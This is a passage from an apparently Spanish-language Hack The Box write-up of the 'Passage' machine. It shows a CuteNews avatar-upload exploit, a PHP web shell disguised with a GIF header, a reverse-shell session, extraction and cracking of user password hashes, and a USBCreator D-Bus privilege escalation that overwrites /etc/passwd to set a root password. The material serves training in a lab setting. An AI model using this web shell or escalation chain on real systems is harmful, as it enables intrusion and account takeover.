    @shell = &quot;#{fname}&quot;
    pdata = Rex::MIME::Message.new
    pdata.add_part('main', nil, nil, 'form-data; name=&quot;mod&quot;')
    pdata.add_part('personal', nil, nil, 'form-data; name=&quot;opt&quot;')
    pdata.add_part(&quot;#{signkey}&quot;, nil, nil, 'form-data; name=&quot;__signature_key&quot;')
    pdata.add_part(&quot;#{signdsi}&quot;, nil, nil, 'form-data; name=&quot;__signature_dsi&quot;')
    pdata.add_part('', nil, nil, 'form-data; name=&quot;editpassword&quot;')
    pdata.add_part('', nil, nil, 'form-data; name=&quot;confirmpassword&quot;')
    pdata.add_part(&quot;#{datastore['USERNAME']}&quot;, nil, nil, 'form-data; name=&quot;editnickname&quot;')
    pdata.add_part(&quot;GIF\r\n&quot; + payload.encoded, 'image/png', nil, &quot;form-data; name=\&quot;avatar_file\&quot;; filename=\&quot;#{fname}\&quot;&quot;)
    pdata.add_part('', nil, nil, 'form-data; name=&quot;more[site]&quot;')
    pdata.add_part('', nil, nil, 'form-data; name=&quot;more[about]&quot;')
    data = pdata.to_s
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Puedes ver este articulo, para comprender a mayor detalle el uso de &lt;code&gt;Magic Numbers&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot;&gt;https://en.wikipedia.org/wiki/List_of_file_signatures&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Como ya sabemos en que consiste la vulnerabilidad, en vez de hacer uso del exploit. Crearemos un archivo &lt;code&gt;php&lt;/code&gt; con esas caracteristicas, que nos permita la ejecución de comandos mediante el uso de un parametro definido &lt;code&gt;cmd&lt;/code&gt; en conjunto con la función &lt;code&gt;shell_exec&lt;/code&gt;. Seguidamente subiremos el archivo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;❯ cat cmd.php
GIF8;

&amp;lt;?php
    echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;El archivo se sube correctamente y consecuentemente inspeccionamos la ruta en donde se encuentra nuestro archivo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a la ruta indicada de nombre &lt;code&gt;uploads&lt;/code&gt; y si vemos nuestro archivo subido.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Verificamos que podemos ejecutar comandos y estamos como &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que sigue sera mandarnos una &lt;code&gt;reverse shell&lt;/code&gt; a nuestra maquina haciendo uso &lt;code&gt;bash&lt;/code&gt; y poniendonos en escucha con &lt;code&gt;ncat&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Recordatorio no olvidar urlencodear el caracter &lt;code&gt;&amp;amp;&lt;/code&gt; a &lt;code&gt;%26&lt;/code&gt; para evitar problemas al procesarse la petición.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Enviamos la petición&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y recibimos la conexión como el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.206.
Ncat: Connection from 10.10.10.206:43080.
bash: cannot set terminal process group (1683): Inappropriate ioctl for device
bash: no job control in this shell
www-data@passage:/var/www/html/CuteNews/uploads$ whoami
whoami
www-data
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como es de costumbre, vamos a obtener una &lt;code&gt;tty&lt;/code&gt; full interactiva con los comandos de siempre.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@passage:/var/www/html/CuteNews/uploads$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@passage:/var/www/html/CuteNews/uploads$ export TERM=xterm
www-data@passage:/var/www/html/CuteNews/uploads$ export SHELL=bash
www-data@passage:/var/www/html/CuteNews/uploads$ stty rows 45 columns 174
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cabe recordar que el numero de &lt;code&gt;rows&lt;/code&gt; y &lt;code&gt;columns&lt;/code&gt; corresponden a las dimensiones de tu pantalla y puedes verificar haciendo uso del comando &lt;code&gt;stty size&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Existe un repositorio de &lt;code&gt;CuteNews&lt;/code&gt; publico en github:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/CuteNews/cutenews-2.0&quot;&gt;https://github.com/CuteNews/cutenews-2.0&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Aqui nos habla que para agregar comentarios, perfiles o cualquier información, no necesita hacer uso de un gestor de base de datos como &lt;code&gt;mysql&lt;/code&gt;. Revisando el repositorio podemos ver que la data lo almacena en un directorio de nombre &lt;code&gt;cdata&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata$ ls 
Default.tpl	    backup	 category.db.php  confirmations.php  idnews.db.php   news	 postponed_news.txt  template		  users.txt
Headlines.tpl	    btree	 comments.txt	  csrf.php	     installed.mark  news.txt	 replaces.php	     unapproved_news.txt
archives	    cache	 conf.php	  flood.db.php       ipban.db.php    newsid.txt  rss.tpl	     users
auto_archive.db.php  cat.num.php  config.php	  flood.txt	     log	     plugins	 rss_config.php      users.db.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro de este directorio en el directorio &lt;code&gt;users&lt;/code&gt;, almacena los datos de los usuarios registrados en un archivo cuyo nombre se computa al tomar los dos primeros caracteres del &lt;code&gt;usuario&lt;/code&gt; en &lt;code&gt;md5&lt;/code&gt; y le agrega la extensión &lt;code&gt;php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como yo cree el usuario &lt;code&gt;fmiracle&lt;/code&gt;, los primeros caracteres corresponderian a &lt;code&gt;cb&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ echo -n &quot;fmiracle&quot; | md5sum
cb151a66aabded3ee89f616afab7b6c9
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que si existe un archivo &lt;code&gt;cb.php&lt;/code&gt; en el directorio asi que procedemos a leerlo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ cat cb.php 
&amp;lt;?php die('Direct call - access denied'); ?&amp;gt;
YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUiO3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmYWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtaXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-d
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya que el formato esta en &lt;code&gt;base64&lt;/code&gt; usaremos un &lt;code&gt;base64 -d&lt;/code&gt; para decodificarla y vemos el &lt;code&gt;hash&lt;/code&gt; correspondiente a la contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ echo &quot;YToxOntzOjQ6Im5hbWUiO2E6MTp7czo4OiJmbWlyYWNsZSI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNjgxNzUwODAyIjtzOjQ6Im5hbWUiO3M6ODoiZm1pcmFjbGUi3M6MzoiYWNsIjtzOjE6IjQiO3M6NToiZW1haWwiO3M6MjE6ImZtaXJhY2xlQGZtaXJhY2xlLmNvbSI7czo0OiJuaWNrIjtzOjg6ImZtaXJhY2xlIjtzOjQ6InBhc3MiO3M6NjQ6IjQ4Yjg0MWJlYTIwNWZkYjJkNjAxNDBhODljOGIzMDA2MThmWNhMjAwZDI2YmQyY2Q0YmQyYzBmNTk4MTgzODMiO3M6NDoibW9yZSI7czo2MDoiWVRveU9udHpPalE2SW5OcGRHVWlPM002TURvaUlqdHpPalU2SW1GaWIzVjBJanR6T2pBNklpSTdmUT09IjtzOjY6ImF2YXRhciI7czoyMzoiYXZhdGFyX2ZtXJhY2xlX2NtZC5waHAiO3M6NjoiZS1oaWRlIjtzOjA6IiI7fX19www-data@passage&quot; | base64 -d; echo

a:1:{s:4:&quot;name&quot;;a:1:{s:8:&quot;fmiracle&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1681750802&quot;;s:4:&quot;name&quot;;s:8:&quot;fmiracle&quot;;s:3:&quot;acl&quot;;s:1:&quot;4&quot;;s:5:&quot;email&quot;;s:21:&quot;fmiracle@fmiracle.com&quot;;s:4:&quot;nick&quot;;s:8:&quot;fmiracle&quot;;s:4:&quot;pass&quot;;s:64:&quot;48b841bea205fdb2d60140a89c8b300618faca200d26bd2cd4bd2c0f59818383&quot;;s:4:&quot;more&quot;;s:60:&quot;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&quot;;s:6:&quot;avatar&quot;;s:23:&quot;avatar_fmiracle_cmd.php&quot;;s:6:&quot;e-hide&quot;;s:0:&quot;&quot;;}}}
                                          base64: invalid input
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a realizar el mismo proceso para todos los archivos y visualizaremos los hashes correspondientes a los usuarios registrados.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ cat * | grep -v &quot;denied&quot; | base64 -d; echo
a:1:{s:5:&quot;email&quot;;a:1:{s:16:&quot;paul@passage.htb&quot;;s:10:&quot;paul-coles&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1598829833;s:6:&quot;egre55&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;egre55@test.com&quot;;s:6:&quot;egre55&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:5:&quot;admin&quot;;a:8:{s:2:&quot;id&quot;;s:10:&quot;1592483047&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;acl&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:17:&quot;nadav@passage.htb&quot;;s:4:&quot;pass&quot;;s:64:&quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487988&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483281;s:9:&quot;sid-meier&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:17:&quot;nadav@passage.htb&quot;;s:5:&quot;admin&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;kim@example.com&quot;;s:9:&quot;kim-swift&quot;;}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483236;s:10:&quot;paul-coles&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:9:&quot;sid-meier&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483281&quot;;s:4:&quot;name&quot;;s:9:&quot;sid-meier&quot;;s:3:&quot;acl&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:15:&quot;sid@example.com&quot;;s:4:&quot;nick&quot;;s:9:&quot;Sid Meier&quot;;s:4:&quot;pass&quot;;s:64:&quot;4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485645&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483047;s:5:&quot;admin&quot;;}}a:1:{s:5:&quot;email&quot;;a:1:{s:15:&quot;sid@example.com&quot;;s:9:&quot;sid-meier&quot;;}}a:1:{s:4:&quot;name&quot;;a:1:{s:10:&quot;paul-coles&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483236&quot;;s:4:&quot;name&quot;;s:10:&quot;paul-coles&quot;;s:3:&quot;acl&quot;;s:1:&quot;2&quot;;s:5:&quot;email&quot;;s:16:&quot;paul@passage.htb&quot;;s:4:&quot;nick&quot;;s:10:&quot;Paul Coles&quot;;s:4:&quot;pass&quot;;s:64:&quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485556&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}a:1:{s:4:&quot;name&quot;;a:1:{s:9:&quot;kim-swift&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483309&quot;;s:4:&quot;name&quot;;s:9:&quot;kim-swift&quot;;s:3:&quot;acl&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:15:&quot;kim@example.com&quot;;s:4:&quot;nick&quot;;s:9:&quot;Kim Swift&quot;;s:4:&quot;pass&quot;;s:64:&quot;f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487096&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;3&quot;;}}}a:1:{s:4:&quot;name&quot;;a:1:{s:6:&quot;egre55&quot;;a:11:{s:2:&quot;id&quot;;s:10:&quot;1598829833&quot;;s:4:&quot;name&quot;;s:6:&quot;egre55&quot;;s:3:&quot;acl&quot;;s:1:&quot;4&quot;;s:5:&quot;email&quot;;s:15:&quot;egre55@test.com&quot;;s:4:&quot;nick&quot;;s:6:&quot;egre55&quot;;s:4:&quot;pass&quot;;s:64:&quot;4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc&quot;;s:4:&quot;more&quot;;s:60:&quot;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&quot;;s:3:&quot;lts&quot;;s:10:&quot;1598834079&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:6:&quot;avatar&quot;;s:26:&quot;avatar_egre55_spwvgujw.php&quot;;s:6:&quot;e-hide&quot;;s:0:&quot;&quot;;}}}a:1:{s:2:&quot;id&quot;;a:1:{i:1592483309;s:9:&quot;kim-swift&quot;;}}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De los hashes obtenidos procederemos a crackearlos en nuestra web de confianza.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;https://crackstation.net/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Logramos obtener unas contraseñas en texto claro.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Passage/cute12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora intentaremos logearnos con algunos de los usuarios del sistema, haciendo uso de las contraseñas que obtuvimos y conseguimos logearnos como el usuario &lt;code&gt;paul&lt;/code&gt;. Podemos ir a su directorio de trabajo y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul
Password: 
paul@passage:/var/www/html/CuteNews/cdata/users$ cd /home/paul/
paul@passage:~$ cat user.txt 
9914c80b41f867472dd68c1e54c77609
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Enumerando al usuario &lt;code&gt;paul&lt;/code&gt;, encontramos que tenemos un directorio oculto &lt;code&gt;.ssh&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;paul@passage:~$ ls -la
total 112
drwxr-x--- 16 paul paul 4096 Sep  2  2020 .
drwxr-xr-x  4 root root 4096 Jul 21  2020 ..
----------  1 paul paul    0 Jul 21  2020 .bash_history
-rw-r--r--  1 paul paul  220 Aug 31  2015 .bash_logout
-rw-r--r--  1 paul paul 3770 Jul 21  2020 .bashrc
drwx------ 10 paul paul 4096 Sep  1  2020 .cache
drwx------ 14 paul paul 4096 Aug 24  2020 .config
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Desktop
-rw-r--r--  1 paul paul   25 Aug 24  2020 .dmrc
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Documents
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Downloads
-rw-r--r--  1 paul paul 8980 Apr 20  2016 examples.desktop
drwx------  2 paul paul 4096 Aug 24  2020 .gconf
drwx------  3 paul paul 4096 Sep  2  2020 .gnupg
-rw-------  1 paul paul 1292 Sep  2  2020 .ICEauthority
drwx------  3 paul paul 4096 Aug 24  2020 .local
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Music
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Pictures
-rw-r--r--  1 paul paul  655 May 16  2017 .profile
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Public
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 .ssh
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Templates
-r--------  1 paul paul   33 Apr 17 09:08 user.txt
drwxr-xr-x  2 paul paul 4096 Jul 21  2020 Videos
-rw-------  1 paul paul   52 Sep  2  2020 .Xauthority
-rw-------  1 paul paul 1228 Sep  2  2020 .xsession-errors
-rw-------  1 paul paul 1397 Sep  1  2020 .xsession-errors.old
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro del directorio podemos visualizar una clave &lt;code&gt;authorized_keys&lt;/code&gt;, que pertenece al usuario &lt;code&gt;nadav&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;paul@passage:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub  known_hosts
paul@passage:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Por principios basicos de claves &lt;code&gt;ssh&lt;/code&gt; al tener la clave publica del usuario &lt;code&gt;nadav&lt;/code&gt;, puedo conectarme como a la propia maquina sin proporcionar contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;paul@passage:~/.ssh$ ssh nadav@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1
nadav@passage:~$ whoami
nadav
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ahora que somos el usuario &lt;code&gt;nadav&lt;/code&gt;, listamos los recursos de su directorio personal y tratando de leer los archivos ocultos, vemos el contenido del archivo &lt;code&gt;viminfo&lt;/code&gt;, el cual hace bastante mención a un archivo &lt;code&gt;USBCreator&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:~$ cat .viminfo 
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&amp;amp;AdminIdentities=unix-group:root

# Last Substitute String:
$AdminIdentities=unix-group:sudo

# Command Line History (newest to oldest):
:wq
:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g

# Search String History (newest to oldest):
? AdminIdentities=unix-group:root

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:

# File marks:
'0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
'1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# Jumplist (newest first):
-'  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
-'  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf

# History of marks within files (newest to oldest):

&amp;gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
	&quot;	12	7

&amp;gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
	&quot;	2	0
	.	2	0
	+	2	0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como hace mucha referencia a el archivo &lt;code&gt;USBCreator&lt;/code&gt;, vamos a proceder a buscar si exiten vulnerabilidades asociadas y concretamente entramos una relacionada a &lt;code&gt;Privilege Escalataion&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Aqui el articulo para mayor detalle:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/&quot;&gt;https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En resumen la vulnerabilidad aprovecha una cierta capacidad de sobrescritura de los permisos de un archivo usando el comando &lt;code&gt;gdbus&lt;/code&gt;, cambiandolos por los del usuario privilegiado &lt;code&gt;root&lt;/code&gt;.
Podemos aprovecharnos de esta vulnerabilidad de muchas maneras. Concretamente en este caso primero realizaremos una copia del &lt;code&gt;/etc/passwd&lt;/code&gt; de la maquina y lo modificaremos agregando una contraseña que vamos a computar con &lt;code&gt;openssl&lt;/code&gt; al usuario &lt;code&gt;root&lt;/code&gt;. Y una vez tengamos el archivo modificado aprovecharemos de esta vulnerabilidad para sobrescribir el archivo original del &lt;code&gt;/etc/passwd&lt;/code&gt; con el nuevo que tenemos, de modo que al haberle cambiado la contraseña a &lt;code&gt;root&lt;/code&gt; podamos convertirnos en el con la contraeñas que le indicamos.&lt;/p&gt;

&lt;p&gt;Vamos a hacerlo paso a paso para que se entienda:&lt;/p&gt;

&lt;p&gt;Primero nos copias el &lt;code&gt;/etc/passwd&lt;/code&gt; para evitar problemas de permisos lo haremos en la ruta &lt;code&gt;tmp&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ cp /etc/passwd .
nadav@passage:/tmp$ ls
config-err-QHQCht                                                       systemd-private-70af303641bf4fb2935fb9f554b4ff23-fwupd.service-rSKHgW              unity_support_test.0
passwd                                                                  systemd-private-70af303641bf4fb2935fb9f554b4ff23-rtkit-daemon.service-1jCj09       VMwareDnD
systemd-private-70af303641bf4fb2935fb9f554b4ff23-colord.service-h1Z4SP  systemd-private-70af303641bf4fb2935fb9f554b4ff23-systemd-timesyncd.service-zchybP  vmware-root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez tenemos el &lt;code&gt;passwd&lt;/code&gt;, vamos a crearnos una contraseña, la cual tiene que estar en formato &lt;code&gt;desk unix&lt;/code&gt;. Eso lo hacemos con &lt;code&gt;openssl passwd&lt;/code&gt;, el cual nos pedira una contraseña. En este caso le pondre algo simple como la palabra &lt;code&gt;hola&lt;/code&gt;, pero se puede poner cualquier cosa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ openssl passwd
Password: 
Verifying - Password: 
POoz1bD1QhbD.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente debemos modifcar el &lt;code&gt;passwd&lt;/code&gt; y en &lt;code&gt;root&lt;/code&gt;. Para esto reeemplazamos la &lt;code&gt;x&lt;/code&gt; por nuestra contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ cat passwd 
root:POoz1bD1QhbD.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nolog
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues tal y como nos dice la vulnerabilidad, usamos el comando &lt;code&gt;gdbuss&lt;/code&gt; tal cual los parametros mencionados y le indicamos primero nuestro archivo &lt;code&gt;/tmp/passwd&lt;/code&gt;y seguido la ruta original donde lo sobreescribiremos &lt;code&gt;/etc/passwd&lt;/code&gt; finalmente el parametro &lt;code&gt;true&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/passwd /etc/passwd true
()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora proceremos a leer el archivo &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ cat /etc/passwd
root:POoz1bD1QhbD.:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que efectivamente lo modificamos la contraseña del usuario &lt;code&gt;root&lt;/code&gt;. Lo que nos queda ahora es migrar al usuario &lt;code&gt;root&lt;/code&gt;, dirigirnos a su directorio personal y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nadav@passage:/tmp$ su root
Password: 
root@passage:/tmp# cd /root
root@passage:~# cat root.txt
